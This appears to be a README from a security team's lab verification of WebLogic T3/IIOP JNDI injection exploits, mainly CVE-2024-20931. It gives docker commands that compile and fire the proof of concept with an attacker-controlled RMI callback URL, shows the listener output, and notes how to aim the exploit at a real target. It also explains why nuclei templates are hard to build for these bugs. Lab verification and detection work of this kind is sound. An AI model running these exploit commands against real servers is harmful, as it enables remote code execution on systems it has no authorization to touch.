# WebLogic JNDI — lab-verified active PoC

Result of the "port-from-PoC + verify-in-lab" effort for the T3/IIOP JNDI CVEs.

## 1. What was verified ✅

| Item | Status |
|------|--------|
| Lab | `container-registry.oracle.com/middleware/weblogic:12.2.1.4`, T3 on `127.0.0.1:7001`, HELO → `12.2.1.4.0` |
| CVE-2023-21839 active nuclei template (upstream) | **MATCHED** on the lab (interactsh DNS callback) |
| CVE-2024-20931 exploit | **FIRED** — server made an outbound JRMP/RMI callback (`0x4a524d49` = `JRMI`) to our listener |

CVE-2024-20931 proof (listener output):

```
[2026-10-01T16:53:15] CALLBACK from ('127.0.0.1', 63346)
    first-bytes: 4a524d4900024b   (JRMI => the WebLogic server dialed out)
```

## 2. Files

- `src/com/supeream/CVE_2024_20931.java` — parameterized PoC (target + attacker JNDI URL).
- `verify-listener.py` — OAST substitute: logs the server's callback (no internet needed).

## 3. How to run (reproduces the verification)

Compile + run **inside the WebLogic container** (it has JDK 8 + `weblogic.jar`; a normal client host works too if it has them):

```bash
docker cp src wls12214:/tmp/poc/src
docker exec wls12214 bash -lc 'cd /tmp/poc && javac -cp $ORACLE_HOME/wlserver/server/lib/weblogic.jar -d out src/com/supeream/CVE_2024_20931.java'
```

Start the listener on the host (OAST substitute):

```bash
python3 verify-listener.py
```

Fire it (container → host via `host.docker.internal`):

```bash
docker exec wls12214 bash -lc 'cd /tmp/poc && java -cp out:$ORACLE_HOME/wlserver/server/lib/weblogic.jar com.supeream.CVE_2024_20931 t3://127.0.0.1:7001 rmi://host.docker.internal:18099/a'
```

A `CALLBACK from ...` line = vulnerable. Against a real target use an interactsh/Burst
Collaborator host instead of `host.docker.internal:18099`.

## 4. Why there is no verified *nuclei* template for 20931/21006/21182

These are **JNDI injection** bugs: they need a stateful T3 **`rebind` + `lookup`** RMI
exchange (store the malicious `ForeignOpaqueReference`, then look it up). That is
fundamentally different from a single-shot deserialization payload (e.g.
CVE-2021-2135) that can be captured once and replayed.

Attempts to capture the T3 wire bytes for a nuclei `javascript:` port were blocked
because:

1. **A transparent proxy breaks T3.** WebLogic's RJVM layer negotiates/validates
   peer addresses bidirectionally; through a MITM the server stops after the
   59-byte `HELO` and the client hangs. The exploit only completes on a *direct*
   single socket (client-port == advertised-port).
2. **No in-container capture tooling.** The image has no `strace`, `gcc`
   (for an `LD_PRELOAD` shim) or `tcpdump` to record the direct run.
3. Even with bytes, a T3 `rebind`+`lookup` is **stateful** (session JVMIDs,
   abbreviation tables) — not a clean replay. A nuclei port would mean
   re-implementing the T3/RMI state machine in JS, the way ProjectDiscovery
   re-implemented the **IIOP** state machine (with live key extraction) for
   CVE-2023-21839.

So the honest active-coverage is: **upstream `CVE-2023-21839` nuclei template
(verified here)** for the JNDI primitive, plus these **lab-verified Java PoCs**
for the specific bypasses, plus the version-detection templates in
`../Nuclei template/`.
